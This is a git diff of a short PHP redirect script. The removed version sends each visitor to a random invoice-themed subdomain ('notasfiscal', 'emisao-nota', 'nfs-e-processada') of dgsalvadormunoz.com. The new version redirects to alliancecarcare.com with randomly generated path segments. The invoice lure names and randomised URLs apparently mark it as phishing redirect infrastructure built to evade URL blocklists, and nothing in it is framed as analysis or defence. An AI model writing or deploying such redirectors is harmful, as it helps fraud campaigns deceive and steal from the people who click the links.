@@ -1,26 +1,17 @@
 <?php
-
-$subdomains = [
-    'notasfiscal',
-    'administracao',
-    'emisao-nota',
-    'nfs-e-processada',
-    'financeiro'
-];
+$baseUrl = 'https://alliancecarcare.com/';
 
 function generateSegment($length) {
-    $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-    return substr(str_shuffle(str_repeat($chars, $length)), 0, $length);
+  $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+  return substr(str_shuffle(str_repeat($chars, $length)), 0, $length);
 }
 
-// escolhe 1 subdomínio aleatório por acesso
-$randomSubdomain = $subdomains[array_rand($subdomains)];
+$urls = [
+  $baseUrl . generateSegment(8) . '/' . generateSegment(8) . '/' . generateSegment(8),
+  $baseUrl . generateSegment(8) . '/' . generateSegment(8) . '/' . generateSegment(8),
+];
 
-$url = 'https://' . $randomSubdomain . '.dgsalvadormunoz.com/'
-    . generateSegment(8) . '/'
-    . generateSegment(8);
-
-header("Location: " . $url);
+$randomUrl = $urls[array_rand($urls)];
+header("Location: " . $randomUrl);
 exit();
-
 ?>
